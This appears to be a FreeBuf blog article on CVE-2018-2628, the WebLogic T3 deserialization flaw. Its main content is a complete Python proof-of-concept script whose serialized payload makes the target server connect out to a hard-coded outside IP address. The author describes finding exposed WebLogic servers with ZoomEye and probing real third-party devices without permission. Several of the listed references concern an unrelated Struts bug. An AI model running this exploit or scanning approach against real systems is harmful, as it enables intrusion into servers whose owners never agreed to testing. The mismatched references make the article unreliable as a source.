@@ -1,0 +1,251 @@
+***本文中涉及到的相关漏洞已报送厂商并得到修复，本文仅限技术研究与讨论，严禁用于非法用途，否则产生的一切后果自行承担。**
+
+ **Oracle Fusion
+Middleware（Oracle融合中间件）是美国甲骨文（Oracle）公司的一套面向企业和云环境的业务创新平台。该平台提供了中间件、软件集合等功能。Oracle
+WebLogic Server是其中的一个适用于云环境和传统环境的应用服务器组件。**
+
+Oracle官方在2018年4月18日发布了4月关键补丁更新，其中包含了Oracle WebLogic
+Server的一个高危漏洞（CVE-2018-2628）。
+
+由于此漏洞产生于Weblogic
+T3服务，当开放Weblogic控制台端口（默认为7001端口）时，T3服务会默认开启，因此会造成较大影响，结合曾经爆出的Weblogic WLS
+组件漏洞（ CVE-2017-10271 ），不排除会有攻击者利用挖矿的可能，因此，建议尽快部署防护措施。
+
+## CVE-2018-2628
+
+攻击者可以在未授权的情况下，通过T3协议在WebLogic Server中执行反序列化操作，最终造成远程代码执行漏洞。  
+Oracle官方将该漏洞等级定义为“高危”
+
+## 漏洞属性
+
+【漏洞评级】 **高危**
+
+【CVE编号】
+
+> CVE-2018-2628
+
+【影响范围】
+
+> Weblogic 10.3.6.0
+>
+> Weblogic 12.1.3.0
+>
+> Weblogic 12.2.1.2
+>
+> Weblogic 12.2.1.3
+
+##  **漏洞代码和过程**
+
+    
+    
+     #!env python    
+    
+    #coding=utf-8
+    
+    #
+    
+    # Author:       liaoxinxi@nsfocus.com
+    
+    #
+    
+    # Created Time: Wed 19 Jul 2017 01:47:53 AM CST
+    
+    #
+    
+    # FileName:     weblogic_poc.py
+    
+    #
+    
+    # Description: 
+    
+    #
+    
+    # ChangeLog:
+    
+    # -*- coding: utf-8 -*-    
+    import socket
+    
+    import time
+    
+    import re
+    
+     
+    
+     
+    
+    VUL=['CVE-2018-2628']
+    
+    PAYLOAD=['aced0005737d00000001001d6a6176612e726d692e61637469766174696f6e2e416374697661746f72787200176a6176612e6c616e672e7265666c6563742e50726f7879e127da20cc1043cb0200014c0001687400254c6a6176612f6c616e672f7265666c6563742f496e766f636174696f6e48616e646c65723b78707372002d6a6176612e726d692e7365727665722e52656d6f74654f626a656374496e766f636174696f6e48616e646c657200000000000000020200007872001c6a6176612e726d692e7365727665722e52656d6f74654f626a656374d361b4910c61331e03000078707737000a556e6963617374526566000e3130342e3235312e3232382e353000001b590000000001eea90b00000000000000000000000000000078']
+    
+    VER_SIG=['\\$Proxy[0-9]+']
+    
+     
+    
+    def t3handshake(sock,server_addr):
+    
+        sock.connect(server_addr)
+    
+        sock.send('74332031322e322e310a41533a3235350a484c3a31390a4d533a31303030303030300a0a'.decode('hex'))
+    
+        time.sleep(1)
+    
+        sock.recv(1024)
+    
+        print 'handshake successful'
+    
+     
+    
+    def buildT3RequestObject(sock,port):
+    
+        data1 = '000005c3016501ffffffffffffffff0000006a0000ea600000001900937b484a56fa4a777666f581daa4f5b90e2aebfc607499b4027973720078720178720278700000000a000000030000000000000006007070707070700000000a000000030000000000000006007006fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e5061636b616765496e666fe6f723e7b8ae1ec90200084900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463684c0009696d706c5469746c657400124c6a6176612f6c616e672f537472696e673b4c000a696d706c56656e646f7271007e00034c000b696d706c56657273696f6e71007e000378707702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e56657273696f6e496e666f972245516452463e0200035b00087061636b616765737400275b4c7765626c6f6769632f636f6d6d6f6e2f696e7465726e616c2f5061636b616765496e666f3b4c000e72656c6561736556657273696f6e7400124c6a6176612f6c616e672f537472696e673b5b001276657273696f6e496e666f417342797465737400025b42787200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e5061636b616765496e666fe6f723e7b8ae1ec90200084900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463684c0009696d706c5469746c6571007e00044c000a696d706c56656e646f7271007e00044c000b696d706c56657273696f6e71007e000478707702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200217765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e50656572496e666f585474f39bc908f10200064900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463685b00087061636b616765737400275b4c7765626c6f6769632f636f6d6d6f6e2f696e7465726e616c2f5061636b616765496e666f3b787200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e56657273696f6e496e666f972245516452463e0200035b00087061636b6167657371'
+    
+        data2 = '007e00034c000e72656c6561736556657273696f6e7400124c6a6176612f6c616e672f537472696e673b5b001276657273696f6e496e666f417342797465737400025b42787200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e5061636b616765496e666fe6f723e7b8ae1ec90200084900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463684c0009696d706c5469746c6571007e00054c000a696d706c56656e646f7271007e00054c000b696d706c56657273696f6e71007e000578707702000078fe00fffe010000aced0005737200137765626c6f6769632e726a766d2e4a564d4944dc49c23ede121e2a0c000078707750210000000000000000000d3139322e3136382e312e323237001257494e2d4147444d565155423154362e656883348cd6000000070000{0}ffffffffffffffffffffffffffffffffffffffffffffffff78fe010000aced0005737200137765626c6f6769632e726a766d2e4a564d4944dc49c23ede121e2a0c0000787077200114dc42bd07'.format('{:04x}'.format(dport))
+    
+        data3 = '1a7727000d3234322e323134'
+    
+        data4 = '2e312e32353461863d1d0000000078'
+    
+        for d in [data1,data2,data3,data4]:
+    
+            sock.send(d.decode('hex'))
+    
+        time.sleep(2)
+    
+        print 'send request payload successful,recv length:%d'%(len(sock.recv(2048)))
+    
+     
+    
+     
+    
+    def sendEvilObjData(sock,data):
+    
+        payload='056508000000010000001b0000005d010100737201787073720278700000000000000000757203787000000000787400087765626c6f67696375720478700000000c9c979a9a8c9a9bcfcf9b939a7400087765626c6f67696306fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200025b42acf317f8060854e002000078707702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200135b4c6a6176612e6c616e672e4f626a6563743b90ce589f1073296c02000078707702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200106a6176612e7574696c2e566563746f72d9977d5b803baf010300034900116361706163697479496e6372656d656e7449000c656c656d656e74436f756e745b000b656c656d656e74446174617400135b4c6a6176612f6c616e672f4f626a6563743b78707702000078fe010000'
+    
+        payload+=data
+    
+        payload+='fe010000aced0005737200257765626c6f6769632e726a766d2e496d6d757461626c6553657276696365436f6e74657874ddcba8706386f0ba0c0000787200297765626c6f6769632e726d692e70726f76696465722e426173696353657276696365436f6e74657874e4632236c5d4a71e0c0000787077020600737200267765626c6f6769632e726d692e696e7465726e616c2e4d6574686f6444657363726970746f7212485a828af7f67b0c000078707734002e61757468656e746963617465284c7765626c6f6769632e73656375726974792e61636c2e55736572496e666f3b290000001b7878fe00ff'
+    
+        payload = '%s%s'%('{:08x}'.format(len(payload)/2 + 4),payload)
+    
+        sock.send(payload.decode('hex'))
+    
+        time.sleep(2)
+    
+        sock.send(payload.decode('hex'))
+    
+        res = ''
+    
+        try:
+    
+            while True:
+    
+                res += sock.recv(4096)
+    
+                time.sleep(0.1)
+    
+        except Exception as e:
+    
+            pass
+    
+        return res
+    
+     
+    
+    def checkVul(res,server_addr,index):
+    
+        p=re.findall(VER_SIG[index], res, re.S)
+    
+        if len(p)>0:
+    
+            print '%s:%d is vul %s'%(server_addr[0],server_addr[1],VUL[index])
+    
+        else:
+    
+            print '%s:%d is not vul %s' % (server_addr[0],server_addr[1],VUL[index])
+    
+     
+    
+     
+    
+    def run(dip,dport,index):
+    
+        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    
+        ##打了补丁之后，会阻塞，所以设置超时时间，默认15s，根据情况自己调整
+    
+        sock.settimeout(65)
+    
+        server_addr = (dip, dport)
+    
+        t3handshake(sock,server_addr)
+    
+        buildT3RequestObject(sock,dport)
+    
+        rs=sendEvilObjData(sock,PAYLOAD[index])
+    
+        print 'rs',rs
+    
+        checkVul(rs,server_addr,index)
+    
+     
+    
+     
+    
+    if __name__=="__main__":
+    
+        ## dip填写被检测ip，dport填写被检测端口号
+    
+        dip = '127.0.0.1'
+    
+        dport = 7001
+    
+        run(dip,dport,0)
+    
+    #    for i in range(0,len(VUL)):
+    
+    #        run(dip,dport,i)
+    
+      
+    
+
+在网络上寻找weblogic服务组件的网络设备，方法有很多，笔者使用的是钟馗之眼。使用命令：app:"weblogic",查到有很多的这种设备。
+
+![图片.png](https://image.3001.net/images/20180419/152410878617.png!small)  
+
+我们找网上找一些设备进行验证，发现直到现在还是有很多存在漏洞的设备。
+
+检测过程：
+
+![图片.png](https://image.3001.net/images/20180419/1524108837182.png!small)
+
+最后检测出某网络设备的漏洞：
+
+![图片.png](https://image.3001.net/images/20180419/15241089023945.png!small)
+
+##  **检测及修复**
+
+Oracle官方已经已经更新修复了该漏洞，给出相应补丁。强烈建议受影响的用户尽快升级更新进行防护。
+
+注：Oracle官方补丁需要用户持有正版软件的许可账号，使用该账号登陆<https://support.oracle.com>后，可以下载最新补丁。
+
+<http://www.oracle.com/technetwork/security-advisory/cpujan2017-2881727.html>
+
+ **已开通网藤
+智能安全CRS公有云账户的用户可直接使用「流行漏洞检测」功能进行检测，尚未开通网藤智能安全的用户，可点击「[这里](https://www.riskivy.com/apply)」，申请免费试用。**
+
+![微信图片_20180419181703.jpg](https://image.3001.net/images/20180419/15241331747578.jpg!small)  
+
+## 参考
+
+> <https://cwiki.apache.org/confluence/display/WW/S2-054>
+>
+> <http://struts.apache.org/plugins/rest/#use-jackson-framework-as-json-> contenttypehandler>
+>
+> <http://toutiao.secjia.com/apache-s2-054-cve-2017-15707>
+>
+> <http://www.oracle.com/technetwork/security-> advisory/cpuapr2018-3678067.html>
+>
+> <http://mp.weixin.qq.com/s/ots0ZImoN5kHCvp9BWfN6w>
+
+***本文作者：tdcoming，转载请注明来自FreeBuf.COM**
+
